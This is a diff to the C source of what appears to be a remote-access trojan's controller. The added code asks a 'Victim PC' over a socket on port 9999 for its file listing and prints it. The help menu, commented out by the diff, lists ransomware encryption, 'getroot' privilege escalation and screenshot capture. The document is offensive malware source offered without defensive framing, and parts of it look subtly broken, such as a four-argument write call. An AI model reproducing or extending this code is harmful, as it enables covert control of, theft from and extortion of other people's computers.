@@ -1,9 +1,12 @@
-#include <stdio.h>
-#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
 #include <netinet/in.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <arpa/inet.h>
+#include <sys/sendfile.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
 
 #define PORT 9999
 #define TRUE 1
@@ -21,6 +24,9 @@ int main(int argc, char **argv){
 
     char menu[BUFSIZE];
     int status;
+    int size;
+    int filehandle;
+    char *file;
 
     if (argc != 2){
         printf("Usage : %s <IP>\n", argv[0]);
@@ -46,6 +52,19 @@ int main(int argc, char **argv){
             recv(clnt_sock, &status, sizeof(int), 0);
             if(status)
                 exit(0);
+        }
+
+        else if(!strcmp(menu, "ls\n")){
+            send(clnt_sock, menu, sizeof(menu) + 1, 0);
+            recv(clnt_sock, &size, sizeof(int), 0);
+            file = malloc(size);
+            recv(clnt_sock, file, size, 0);
+            filehandle = creat("temp_ls.txt", 0777);
+            write(filehandle, file, size, 0);
+            close(filehandle);
+            printf("\033[1;36mVictim PC's file list -----\033[1;0m\n");
+            system("cat temp_ls.txt");
+            system("rm temp_ls.txt");
         }
 
 
@@ -86,7 +105,7 @@ void print_help_Command(){
     printf("\033[1;0m       Command             Description\n");
     printf("\033[1;0m       -------             ---------------------\n");
     printf("\033[1;0m       help                Help menu\n");
-    printf("\033[1;0m       cd                  Change the current working "
+    /*printf("\033[1;0m       cd                  Change the current working "
            "directory\n");
 
     printf(
@@ -110,5 +129,5 @@ void print_help_Command(){
     printf("\033[1;0m       ransomeware         Encryption file\n");
     printf("\033[1;0m       decryption          Decryption file\n");
     printf("\033[1;0m       getroot             GET SUPER USER\n");
-    printf("\033[1;0m       screenshot          Get screenshot\n\n\n");
+    printf("\033[1;0m       screenshot          Get screenshot\n\n\n");*/
 }
